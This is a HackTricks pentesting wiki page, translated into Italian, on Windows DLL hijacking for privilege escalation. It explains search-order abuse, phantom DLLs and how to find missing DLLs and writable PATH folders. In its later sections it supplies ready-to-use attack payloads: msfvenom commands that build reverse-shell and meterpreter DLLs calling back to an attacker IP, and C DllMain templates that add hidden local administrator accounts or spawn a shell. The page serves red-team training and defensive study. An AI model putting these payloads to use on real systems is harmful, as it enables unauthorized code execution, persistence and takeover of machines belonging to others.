# Dll Hijacking

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="../../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>

**Bug bounty tip**: **iscriviti** a **Intigriti**, una premium **bug bounty platform creata da hacker, per hacker**! Unisciti a noi su [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) oggi, e inizia a guadagnare ricompense fino a **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

## Basic Information

DLL Hijacking implica la manipolazione di un'applicazione fidata per caricare un DLL malevolo. Questo termine comprende diverse tattiche come **DLL Spoofing, Injection, e Side-Loading**. È principalmente utilizzato per l'esecuzione di codice, per ottenere persistenza e, meno comunemente, per l'escalation dei privilegi. Nonostante l'attenzione sull'escalation qui, il metodo di hijacking rimane coerente attraverso gli obiettivi.

### Common Techniques

Vengono impiegati diversi metodi per il DLL hijacking, ognuno con la propria efficacia a seconda della strategia di caricamento del DLL dell'applicazione:

1. **DLL Replacement**: Sostituzione di un DLL genuino con uno malevolo, utilizzando eventualmente il DLL Proxying per preservare la funzionalità del DLL originale.
2. **DLL Search Order Hijacking**: Posizionamento del DLL malevolo in un percorso di ricerca davanti a quello legittimo, sfruttando il modello di ricerca dell'applicazione.
3. **Phantom DLL Hijacking**: Creazione di un DLL malevolo per un'applicazione da caricare, pensando che sia un DLL richiesto non esistente.
4. **DLL Redirection**: Modifica dei parametri di ricerca come `%PATH%` o file `.exe.manifest` / `.exe.local` per indirizzare l'applicazione al DLL malevolo.
5. **WinSxS DLL Replacement**: Sostituzione del DLL legittimo con un corrispondente malevolo nella directory WinSxS, un metodo spesso associato al DLL side-loading.
6. **Relative Path DLL Hijacking**: Posizionamento del DLL malevolo in una directory controllata dall'utente con l'applicazione copiata, somigliante alle tecniche di Binary Proxy Execution.

## Finding missing Dlls

Il modo più comune per trovare DLL mancanti all'interno di un sistema è eseguire [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) da sysinternals, **impostando** i **seguenti 2 filtri**:

![](<../../.gitbook/assets/image (311).png>)

![](<../../.gitbook/assets/image (313).png>)

e mostrare solo l'**Attività del File System**:

![](<../../.gitbook/assets/image (314).png>)

Se stai cercando **dll mancanti in generale** puoi **lasciare** questo in esecuzione per alcuni **secondi**.\
Se stai cercando un **dll mancante all'interno di un eseguibile specifico** dovresti impostare **un altro filtro come "Process Name" "contains" "\<exec name>", eseguirlo e fermare la cattura degli eventi**.

## Exploiting Missing Dlls

Per poter elevare i privilegi, la migliore possibilità che abbiamo è quella di **scrivere un dll che un processo privilegiato cercherà di caricare** in qualche **luogo dove verrà cercato**. Pertanto, saremo in grado di **scrivere** un dll in una **cartella** dove il **dll viene cercato prima** della cartella dove si trova il **dll originale** (caso strano), oppure saremo in grado di **scrivere in qualche cartella dove il dll verrà cercato** e il **dll originale non esiste** in nessuna cartella.

### Dll Search Order

**All'interno della** [**documentazione Microsoft**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **puoi trovare come i DLL vengono caricati specificamente.**

**Le applicazioni Windows** cercano i DLL seguendo un insieme di **percorsi di ricerca predefiniti**, aderendo a una particolare sequenza. Il problema del DLL hijacking sorge quando un DLL dannoso è strategicamente posizionato in una di queste directory, assicurando che venga caricato prima del DLL autentico. Una soluzione per prevenire questo è garantire che l'applicazione utilizzi percorsi assoluti quando si riferisce ai DLL di cui ha bisogno.

Puoi vedere l'**ordine di ricerca dei DLL sui sistemi a 32 bit** qui sotto:

1. La directory da cui l'applicazione è stata caricata.
2. La directory di sistema. Usa la funzione [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) per ottenere il percorso di questa directory.(_C:\Windows\System32_)
3. La directory di sistema a 16 bit. Non esiste una funzione che ottiene il percorso di questa directory, ma viene cercata. (_C:\Windows\System_)
4. La directory di Windows. Usa la funzione [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) per ottenere il percorso di questa directory.
1. (_C:\Windows_)
5. La directory corrente.
6. Le directory elencate nella variabile di ambiente PATH. Nota che questo non include il percorso per applicazione specificato dalla chiave di registro **App Paths**. La chiave **App Paths** non viene utilizzata quando si calcola il percorso di ricerca del DLL.

Questo è l'**ordine di ricerca predefinito** con **SafeDllSearchMode** abilitato. Quando è disabilitato, la directory corrente sale al secondo posto. Per disabilitare questa funzionalità, crea il valore di registro **HKEY\_LOCAL\_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** e impostalo su 0 (il valore predefinito è abilitato).

Se la funzione [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) viene chiamata con **LOAD\_WITH\_ALTERED\_SEARCH\_PATH**, la ricerca inizia nella directory del modulo eseguibile che **LoadLibraryEx** sta caricando.

Infine, nota che **un dll potrebbe essere caricato indicando il percorso assoluto invece del solo nome**. In tal caso, quel dll è **solo cercato in quel percorso** (se il dll ha dipendenze, verranno cercate come se fossero state caricate solo per nome).

Ci sono altri modi per alterare i modi di alterare l'ordine di ricerca, ma non li spiegherò qui.

#### Exceptions on dll search order from Windows docs

Alcune eccezioni all'ordine di ricerca standard dei DLL sono annotate nella documentazione di Windows:

* Quando si incontra un **DLL che condivide il proprio nome con uno già caricato in memoria**, il sistema bypassa la ricerca abituale. Invece, esegue un controllo per la reindirizzazione e un manifesto prima di tornare al DLL già in memoria. **In questo scenario, il sistema non esegue una ricerca per il DLL**.
* Nei casi in cui il DLL è riconosciuto come un **DLL noto** per la versione corrente di Windows, il sistema utilizzerà la sua versione del DLL noto, insieme a qualsiasi DLL dipendente, **saltando il processo di ricerca**. La chiave di registro **HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** contiene un elenco di questi DLL noti.
* Se un **DLL ha dipendenze**, la ricerca di questi DLL dipendenti viene condotta come se fossero indicati solo dai loro **nomi di modulo**, indipendentemente dal fatto che il DLL iniziale sia stato identificato tramite un percorso completo.

### Escalating Privileges

**Requisiti**:

* Identificare un processo che opera o opererà con **privilegi diversi** (movimento orizzontale o laterale), che **manca di un DLL**.
* Assicurarsi che sia disponibile **accesso in scrittura** per qualsiasi **directory** in cui il **DLL** sarà **cercato**. Questa posizione potrebbe essere la directory dell'eseguibile o una directory all'interno del percorso di sistema.

Sì, i requisiti sono complicati da trovare poiché **per impostazione predefinita è piuttosto strano trovare un eseguibile privilegiato mancante di un dll** ed è ancora **più strano avere permessi di scrittura su una cartella di percorso di sistema** (non puoi per impostazione predefinita). Ma, in ambienti mal configurati, questo è possibile.\
Nel caso tu sia fortunato e ti trovi a soddisfare i requisiti, potresti controllare il progetto [UACME](https://github.com/hfiref0x/UACME). Anche se il **principale obiettivo del progetto è bypassare UAC**, potresti trovare lì un **PoC** di un Dll hijacking per la versione di Windows che puoi utilizzare (probabilmente cambiando solo il percorso della cartella in cui hai permessi di scrittura).

Nota che puoi **controllare i tuoi permessi in una cartella** facendo:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
E **controlla i permessi di tutte le cartelle all'interno di PATH**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Puoi anche controllare le importazioni di un eseguibile e le esportazioni di un dll con:
```c
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Per una guida completa su come **abuse Dll Hijacking per escalare privilegi** con permessi di scrittura in una **cartella di System Path**, controlla:

{% content-ref url="dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md" %}
[writable-sys-path-+dll-hijacking-privesc.md](dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md)
{% endcontent-ref %}

### Strumenti automatizzati

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)verificherà se hai permessi di scrittura su qualsiasi cartella all'interno del system PATH.\
Altri strumenti automatizzati interessanti per scoprire questa vulnerabilità sono le **funzioni di PowerSploit**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ e _Write-HijackDll._

### Esempio

Nel caso tu trovi uno scenario sfruttabile, una delle cose più importanti per sfruttarlo con successo sarebbe **creare un dll che esporta almeno tutte le funzioni che l'eseguibile importerà da esso**. Comunque, nota che Dll Hijacking è utile per [escalare da Medium Integrity level a High **(bypassando UAC)**](../authentication-credentials-uac-and-efs.md#uac) o da [**High Integrity a SYSTEM**](./#from-high-integrity-to-system)**.** Puoi trovare un esempio di **come creare un dll valido** all'interno di questo studio di dll hijacking focalizzato sul dll hijacking per l'esecuzione: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Inoltre, nella **prossima sezione** puoi trovare alcuni **codici dll di base** che potrebbero essere utili come **modelli** o per creare un **dll con funzioni non richieste esportate**.

## **Creazione e compilazione di Dlls**

### **Dll Proxifying**

Fondamentalmente, un **Dll proxy** è un Dll capace di **eseguire il tuo codice malevolo quando caricato** ma anche di **esporre** e **funzionare** come **previsto** **inoltrando tutte le chiamate alla libreria reale**.

Con lo strumento [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) o [**Spartacus**](https://github.com/Accenture/Spartacus) puoi effettivamente **indicare un eseguibile e selezionare la libreria** che vuoi proxificare e **generare un dll proxificato** oppure **indicare il Dll** e **generare un dll proxificato**.

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Ottieni un meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Crea un utente (x86 non ho visto una versione x64):**
```
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Il tuo

Nota che in diversi casi la Dll che compili deve **esportare diverse funzioni** che verranno caricate dal processo vittima; se queste funzioni non esistono, il **binario non sarà in grado di caricarle** e l'**exploit fallirà**.
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```

```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```

```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
## Riferimenti

* [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
* [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)

<figure><img src="../../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>

**Suggerimento per bug bounty**: **iscriviti** a **Intigriti**, una premium **bug bounty platform creata da hacker, per hacker**! Unisciti a noi su [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) oggi, e inizia a guadagnare ricompense fino a **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

{% hint style="success" %}
Impara e pratica AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Impara e pratica GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Supporta HackTricks</summary>

* Controlla i [**piani di abbonamento**](https://github.com/sponsors/carlospolop)!
* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Condividi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos su github.

</details>
{% endhint %}
